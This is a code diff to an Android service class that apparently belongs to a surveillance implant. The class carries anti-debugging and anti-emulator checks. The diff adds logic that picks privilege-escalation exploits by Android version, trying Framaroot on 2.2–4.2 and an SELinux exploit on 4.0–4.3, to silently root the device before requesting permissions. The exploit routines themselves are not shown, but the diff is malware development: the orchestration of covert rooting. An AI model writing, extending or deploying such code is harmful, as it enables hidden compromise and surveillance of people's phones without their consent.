@@ -84,12 +84,71 @@ public class ServiceMain extends Service {
 
 		// ANTIDEBUG ANTIEMU
 		if (Core.checkStatic()) {
-			if (Root.isRootShellInstalled() == false && Root.checkExploitability()) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onStart): Device seems locally exploitable"); //$NON-NLS-1$
+			if (Root.isRootShellInstalled() == false) { // Exploitation required
+				// <= 2.1 is a bit too old
+				if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(onStart): Android <= 2.1, version too old");
+					}
+					
+				    return;
+				} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO && android.os.Build.VERSION.SDK_INT <= 13) { // FROYO - HONEYCOMB_MR2
+					// Framaroot
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(onStart): Android 2.2 to 3.2 detected attempting Framaroot");
+					}
+					
+					if (Root.checkFramarootExploitability()) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (onStart): Device seems locally exploitable"); //$NON-NLS-1$
+						}
+						
+						Root.framarootExploit();
+					}
+				} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH - JELLY_BEAN_MR1 
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(onStart): Android 4.0 to 4.2 detected attempting Framaroot then SELinux exploitation");
+					}
+					
+					if (Root.checkFramarootExploitability()) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (onStart): Device seems locally exploitable"); //$NON-NLS-1$
+						}
+						
+						Root.framarootExploit();
+					}
+					
+					if (PackageInfo.checkRoot() == false) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(onStart): Framaroot exploitation failed, using SELinux exploitation");
+						}
+						
+						if (Root.checkSELinuxExploitability()) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (onStart): SELinux Device seems locally exploitable"); //$NON-NLS-1$
+							}
+							
+							Root.selinuxExploit();
+						}
+					}
+				} else if (android.os.Build.VERSION.SDK_INT == 18) { // JELLY_BEAN_MR2
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(onStart): Android 4.3 detected attempting SELinux exploitation");
+					}
+					
+					if (Root.checkSELinuxExploitability()) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (onStart): SELinux Device seems locally exploitable"); //$NON-NLS-1$
+						}
+						
+						Root.selinuxExploit();
+					}
+				} else if (android.os.Build.VERSION.SDK_INT >= 19) { // KITKAT+
+					// Nada
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(onStart): Android >= 4.4 detected, nope nope");
+					}
 				}
-				
-				Root.localExploit();
 			}
 			
 			Root.getPermissions();
